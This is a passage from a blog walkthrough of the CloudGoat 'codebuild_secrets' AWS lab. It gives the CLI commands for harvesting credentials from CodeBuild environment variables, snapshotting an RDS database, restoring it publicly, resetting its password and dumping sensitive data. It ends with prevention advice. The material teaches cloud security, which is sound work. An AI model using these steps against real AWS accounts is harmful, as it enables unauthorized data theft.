</span></span></code></pre></div><p>Awesome, we have another set of keys. These keys seem to be for a user name Calrissian. It seems like this organization has a fondness for Star Trek.</p><hr><h3 id=codebuild-manual-enumeration>Codebuild Manual Enumeration<a hidden class=anchor aria-hidden=true href=#codebuild-manual-enumeration>#</a></h3><p>Before we dig into the Calrissian user, lets take a step back and re run this codebuild enumeration using the aws cli. We start buy querying aws for a list of every project.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile solo codebuild list-projects
</span></span></code></pre></div><p>This produces the name of the project <code>cg-codebuild-cgidg25jfhzv9a</code></p><p><img loading=lazy src=images/codebuild-projects.png alt=codebuild_projects title=img-fluid></p><p>Now that we have the project name we can query aws for the details about the project with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile solo codebuild batch-get-projects --names cg-codebuild-cgidg25jfhzv9a
</span></span></code></pre></div><p>This dumps all of the details about the project. Cleaning the request up a little bit with jq:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile solo codebuild batch-get-projects --names cg-codebuild-cgidg25jfhzv9a <span class=p>|</span>jq <span class=s1>&#39;.projects[].environment.environmentVariables[]&#39;</span>
</span></span></code></pre></div><p>We get the clean output below.</p><p><img loading=lazy src=images/codebuild-creds.png alt=codebuild_creds title=img-fluid></p><hr><h3 id=calrissian>Calrissian<a hidden class=anchor aria-hidden=true href=#calrissian>#</a></h3><p>It&rsquo;s time to find out what permissions we have as the Calrissian user. First we will make sure the credentials work by running <code>get-caller-identity</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile cal sts get-caller-identity
</span></span></code></pre></div><p><img loading=lazy src=images/cal-whoami.png alt=cal_whoami title=img-fluid></p><p>We have confirmed the credentials are still valid. Now we need to start the enumeration process over again. We can start just like last time and see if we have access to s3.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile cal s3 ls
</span></span></code></pre></div><p><img loading=lazy src=images/cal-s3.png alt=cal_s3 title=img-fluid></p><p>Unfortunatly, just like the solo user we do not have access to s3. In fact judging by this error we have even less permission to s3 now than we did with solo. Solo had a policy action to describe-buckets, and we do not.</p><p>Attempting to describe instances returns a similar error that we are unauthorized.</p><p><img loading=lazy src=images/cal-ec2.png alt=cal_ec2 title=img-fluid></p><p>After lots of additional enumeration (and remembering the goal is to access an RDS database) we finally come across an area of aws where we have permissions, RDS. We can determine this and learn details about the environment with the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile cal rds describe-db-instances <span class=p>|</span>jq <span class=s1>&#39;.DBInstances[]&#39;</span>
</span></span></code></pre></div><p>All kinds of useful information is returned as we can see in the screenshot below:</p><p><img loading=lazy src=images/cal-rds.png alt=cal_rds title=img-fluid></p><p>From the details in the screenshot we can determine the type of database, its DNS name, port its listening on, the security group it is a part of, and subnet information.</p><ul><li>Instance Identifer: cg-rds-instance-cgidg25jfhzv9a</li><li>Engine: postgres</li><li>Endpoint: cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com</li><li>Port: 5432</li><li>Security Group: sg-096bb9f39aaa9334d</li><li>Subnets: subnet-029ccc8e6ee777916, subnet-054c36278fc5a0b5c</li></ul><p>Lets see if we can connect. We still do not have a password, but if we can connect, we can try and work around that. We know the database is a postgres server so we can use the following command to attempt a connection:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>psql -h cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com -p <span class=m>5432</span>
</span></span></code></pre></div><p>That does not seem to work, it just hangs for a couple of minutes, the psql app is probably trying to connect/reconnect before timing out. Lets confirm that the RDS instance is listening on 5432 and that we have access to it. We can do this with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -Pn -p5432 cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com
</span></span></code></pre></div><p>Looking at the nmap output, it appears that the RDS instance is not configured in a way that we have access to it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>5432/tcp filtered postgresql
</span></span></code></pre></div><p>At this point we know we have access to make RDS calls. We do not know what our limits are but perhaps we have additional rights. There are a few different paths we could take at this point:</p><ol><li>We can attempt to take our DB public with modify-db-subnet-group, and then attempt to modify the instance to set a password</li><li>We can attempt to take a snapshot and then share the snapshot with an account we control</li><li>We can attempt to snapshot the instance, and create a public version that we control</li></ol><p>The issue with option 1 is that we have no idea what this might break. It could cause the entire app stack which leverages this DB to crash. As soon as that happens someone will start to dig into why did it crash and inevitably start asking questions about why the DB suddenly changed subnets. Option 2 is a valid and viable option, but in this scenario not necessary. We will move ahead with option 3.
Back to enumeration! Lets see if we can gain some insight into the subnets, and security groups.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile cal rds describe-db-subnet-groups <span class=p>|</span>jq
</span></span></code></pre></div><p>Looking at the output from the command above we see all of the subnets that rds has access to. The two subnets associated with the instance we discovered earlier are a part of a group which has the description: <code>CloudGoat cgidg25jfhzv9a Subnet Group</code>. There does appear to be another subnet group called: <code>cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a</code> and has a description of <code>CloudGoat cgidg25jfhzv9a Subnet Group ONLY for Testing with Public Subnets</code>. Perhaps we could use this group to grant public access to an instance.</p><p>Next we should see if there is a security group that would allow us to access the RDS instance. We can use the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile cal ec2 describe-security-groups <span class=p>|</span>jq
</span></span></code></pre></div><p>The output from the command above reveals that the group sg-096bb9f39aaa9334d is a security group that allows access to the postgres port. Screenshot is below.</p><p><img loading=lazy src=images/rds-security-group.png alt=rds_security_group title=img-fluid></p><hr><h3 id=our-own-db>Our own DB<a hidden class=anchor aria-hidden=true href=#our-own-db>#</a></h3><p>At this point we know we have a subnet, and a security group that we can apply to an RDS instance that should grant us the access we are looking for. The next thing we should do is see if we have rights to create a snapshot.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile cal rds create-db-snapshot --db-instance-identifier cg-rds-instance-cgidg25jfhzv9a --db-snapshot-identifier yogi-db-snap
</span></span></code></pre></div><p>After running the command above we get an output that shows us that the command was successful, and that the current status is creating.</p><p><img loading=lazy src=images/db-snap.png alt=db_snap title=img-fluid>
Before we can restore our snapshot to an RDS instance that we control the snapshot needs to be completed. We can check that by using the describe-db-snapshots command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile cal rds describe-db-snapshots --db-snapshot-identifier yogi-db-snap
</span></span></code></pre></div><p>After executing that command we get the output below, which tells us that we do not have permissions to check on the status of our db.</p><p><img loading=lazy src=images/rds-describe.png alt=rds_describe title=img-fluid></p><p>Hopefully, this is not a sign of things to come. Since we do not know if the snapshot is complete the only option we have is to wait until we think its done. After that we can attempt to restore it, and hopefully we will have enough permissions to do so.</p><p>To restore the database we need the following bits information that we discovered earlier:</p><ul><li>RDS Public Subnet Name: cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a</li><li>VPC Security group that grants us access: sg-096bb9f39aaa9334d</li></ul><p>We can use the information above and build the command below to start the build process:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile cal rds restore-db-instance-from-db-snapshot --db-instance-identifier yogidbinstance --db-snapshot-identifier yogi-db-snap --db-subnet-group-name cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a --publicly-accessible --vpc-security-group-ids sg-096bb9f39aaa9334d
</span></span></code></pre></div><p>The output should return something similar to the image below with the &lsquo;DBInstanceStatus&rsquo; of creating</p><p><img loading=lazy src=images/db-creating.png alt=db_creating title=img-fluid></p><p>After a couple of minutes we can check the status of our creation with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile cal rds describe-db-instances --db-instance-identifier yogidbinstance <span class=p>|</span>jq <span class=s1>&#39;.DBInstances[] .DBInstanceStatus&#39;</span>
</span></span></code></pre></div><p>Once the output shows that the db is &lsquo;available&rsquo; we can attemp to connect. The connection address was given to us when we ran the restore command above, but if you lost that we can get the information with the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile cal rds describe-db-instances --db-instance-identifier yogidbinstance <span class=p>|</span>jq <span class=s1>&#39;.DBInstances[] .Endpoint&#39;</span>
</span></span></code></pre></div><p><img loading=lazy src=images/yogi-instance.png alt=yogi_instance title=img-fluid></p><p>We can use psql to attempt a connection to the db host:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>psql -h yogidbinstance.cq9megh2xpgg.us-east-1.rds.amazonaws.com -p <span class=m>5432</span>
</span></span></code></pre></div><p><img loading=lazy src=images/psql-success.png alt=psql_success title=img-fluid></p><p>Great, we have a connetion! Now we need to connect with the default cgadmin and the admin password. However, before we do that we need to set the password to something we know. To do that we need to run the modify-db-instance command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile cal rds modify-db-instance --db-instance-identifier yogidbinstance --master-user-password yogibear
</span></span></code></pre></div><p>We will receive an output that shows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s2>&#34;PendingModifiedValues&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl> <span class=s2>&#34;MasterUserPassword&#34;</span>: <span class=s2>&#34;****&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>,
</span></span></code></pre></div><p>Now lets try to connect to our RDS instance one more time.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>psql postgresql://cgadmin@yogidbinstance.cq9megh2xpgg.us-east-1.rds.amazonaws.com:5432/postgres
</span></span></code></pre></div><p>We can list the databases with <code>\l</code></p><p><img loading=lazy src=images/postgres-list.png alt=postgres_list title=img-fluid></p><p>Looking at the output, the securedb looks interesting. Lets connect to it, list the tables, and print it all to the screen.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-postgres data-lang=postgres><span class=line><span class=cl><span class=err>\</span><span class=n>c</span> <span class=n>securedb</span>
</span></span><span class=line><span class=cl><span class=err>\</span><span class=n>dt</span>
</span></span><span class=line><span class=cl><span class=k>SELECT</span> <span class=o>*</span> <span class=k>FROM</span> <span class=n>sensitive_information</span><span class=p>;</span>
</span></span></code></pre></div><p><img loading=lazy src=images/victory.png alt=victory.png title=img-fluid></p><p>Awesome! We succesfull gained access to the secret information within the RDS database.</p><hr><h3 id=alternative-path>Alternative Path<a hidden class=anchor aria-hidden=true href=#alternative-path>#</a></h3><p>There is another way to gain access to the secrets held in the database. I have not worked through that path. Once I do I will update this document.</p><hr><h3 id=prevention>Prevention<a hidden class=anchor aria-hidden=true href=#prevention>#</a></h3><p>Where did the owner of this account go wrong? There are a few places where this attack could have be stopped. Lets dive into them.</p><ol><li>Our initial access was through the solo user. Does that user need static keys? If they could be switched to temorary ephemeral keys it would greatly reduce the liklihood that if an attacker found the keys that they would still be valid.</li><li>Does solo need access to codebuild? Chances are they do, the permissions seemed to be fairly tightly scoped around that service. But if they do not, removing those capabilities would be good.</li><li>Within the codebuild project we came across keys for the calrissian user. Those keys should not exist within this project. Assuming the keys were placed there to grant the Linux container associated with this project access to RDS or other portions of AWS, there are better ways to do this. Assigning a role to the node where the container lives would be the best option. If the container does not live within aws, using a secrets manager is the next best thing.</li><li>The calrissian user seemed to have a mismash of permissions in RDS. If these permission are not all required they should be removed. Specifically the modify-db-instance, and create-db-snapshot permissions.</li></ol><p>By fixing one of these things or all of them, it would have effected our ability to access the secret data within the database.</p><p>From a logging and alerting point of view, we probably made several commands that were not &rsquo;normal&rsquo; for the solo and calrissian users to make. By alerting on this odd activity the response team could have detected us and shut the attack down. Additionally if there would have been a configuration management solution to monitor for RDS instances being made public and preventing it. It would have made our attack much more complicated.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://jellyparks.com/tags/aws/>aws</a></li><li><a href=https://jellyparks.com/tags/cloud/>cloud</a></li><li><a href=https://jellyparks.com/tags/cloudgoat/>cloudgoat</a></li><li><a href=https://jellyparks.com/tags/walkthrough/>walkthrough</a></li><li><a href=https://jellyparks.com/tags/ctf/>ctf</a></li></ul><nav class=paginav><a class=prev href=https://jellyparks.com/cloudgoat/iam-privesc-by-rollback/><span class=title>« Prev Page</span><br><span>iam_privesc_by_rollback</span></a>
<a class=next href=https://jellyparks.com/cloudgoat/what-is-cloudgoat/><span class=title>Next Page »</span><br><span>what_is_cloudgoat</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share codebuild_secrets on twitter" href="https://twitter.com/intent/tweet/?text=codebuild_secrets&url=https%3a%2f%2fjellyparks.com%2fcloudgoat%2fcodebuild-secrets%2f&hashtags=aws%2ccloud%2ccloudgoat%2cwalkthrough%2cctf"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share codebuild_secrets on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fjellyparks.com%2fcloudgoat%2fcodebuild-secrets%2f&title=codebuild_secrets&summary=codebuild_secrets&source=https%3a%2f%2fjellyparks.com%2fcloudgoat%2fcodebuild-secrets%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share codebuild_secrets on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fjellyparks.com%2fcloudgoat%2fcodebuild-secrets%2f&title=codebuild_secrets"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share codebuild_secrets on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fjellyparks.com%2fcloudgoat%2fcodebuild-secrets%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share codebuild_secrets on whatsapp" href="https://api.whatsapp.com/send?text=codebuild_secrets%20-%20https%3a%2f%2fjellyparks.com%2fcloudgoat%2fcodebuild-secrets%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share codebuild_secrets on telegram" href="https://telegram.me/share/url?text=codebuild_secrets&url=https%3a%2f%2fjellyparks.com%2fcloudgoat%2fcodebuild-secrets%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://jellyparks.com>JellyParks</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>